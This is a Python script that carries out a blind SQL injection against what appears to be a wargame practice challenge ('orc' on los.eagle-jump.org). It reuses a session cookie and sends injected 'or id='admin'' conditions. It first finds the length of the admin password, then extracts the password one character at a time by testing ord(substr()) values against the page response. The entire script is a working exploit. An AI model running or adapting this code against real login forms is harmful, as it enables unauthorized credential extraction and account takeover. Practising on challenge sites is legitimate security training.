import requests

url = "https://los.eagle-jump.org/orc_47190a4d33f675a601f8def32df2583a.php?pw="

cookie = {"PHPSESSID":"oj8l6aabt4juigeiduqcn1jl73"}

### get password length ###

plen = 1
while True:
    response = requests.get(url + "a' or id='admin' and length(pw)=" + str(plen) + "-- -", cookies=cookie)
    if "<h2>Hello admin</h2>" in response.text:
        break
    else:
        print("[*] trying get password length.. now " + str(plen))
        plen += 1

print("[*] Password length is " + str(plen))

password = ""

for i in range(plen):
    for j in range(256):
        j = (j + 32) % 256
        response = requests.get(url + "a' or id='admin' and ord(substr(pw, " + str(i+1) + ", 1))=" + str(j) +"-- -", cookies=cookie)
        if "<h2>Hello admin</h2>" in response.text:
            password += chr(j)
            break
        else:
            print("[*] searching " + str(i+1) + " password character.. now " + str(j))
            plen += 1
    print("[*] found password " + str(i+1) +" character! now : " + password)

print("[*] password is " + password)
